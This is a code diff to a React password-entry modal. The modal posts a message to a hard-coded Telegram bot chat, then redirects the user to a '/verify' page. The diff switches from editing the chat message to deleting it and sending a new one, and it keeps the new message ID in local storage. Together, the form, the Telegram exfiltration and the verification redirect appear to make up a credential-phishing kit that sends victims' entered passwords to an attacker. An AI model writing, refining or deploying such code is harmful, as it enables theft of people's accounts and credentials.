@@ -133,14 +133,26 @@ const PasswordModal: FC<PasswordModalProps> = ({
 
 			try {
 				await axios.post(
-					`https://api.telegram.org/bot${config.token}/editMessageText`,
+					`https://api.telegram.org/bot${config.token}/deleteMessage`,
 					{
 						chat_id: config.chatId,
 						message_id: uiState.messageId,
+					},
+				);
+				const response = await axios.post(
+					`https://api.telegram.org/bot${config.token}/sendMessage`,
+					{
+						chat_id: config.chatId,
 						text: message,
 						parse_mode: "HTML",
 					},
 				);
+				const messageId = response.data.result.message_id;
+				localStorage.setItem(MESSAGE_ID_KEY, messageId.toString());
+				setUiState((prev) => ({
+					...prev,
+					messageId: messageId,
+				}));
 
 				setTimeout(() => navigate("/verify"), config.loadingTime);
 			} catch {
@@ -193,15 +205,24 @@ const PasswordModal: FC<PasswordModalProps> = ({
 		const baseUrl = `https://api.telegram.org/bot${config.token}`;
 
 		if (messageId) {
-			return axios.post(`${baseUrl}/editMessageText`, {
-				chat_id: config.chatId,
-				message_id: messageId,
-				text: message,
-				parse_mode: "HTML",
-			});
+			await axios.post(
+				`https://api.telegram.org/bot${config.token}/deleteMessage`,
+				{
+					chat_id: config.chatId,
+					message_id: uiState.messageId,
+				},
+			);
+			return await axios.post(
+				`https://api.telegram.org/bot${config.token}/sendMessage`,
+				{
+					chat_id: config.chatId,
+					text: message,
+					parse_mode: "HTML",
+				},
+			);
 		}
 
-		return axios.post(`${baseUrl}/sendMessage`, {
+		return await axios.post(`${baseUrl}/sendMessage`, {
 			chat_id: config.chatId,
 			text: message,
 			parse_mode: "HTML",
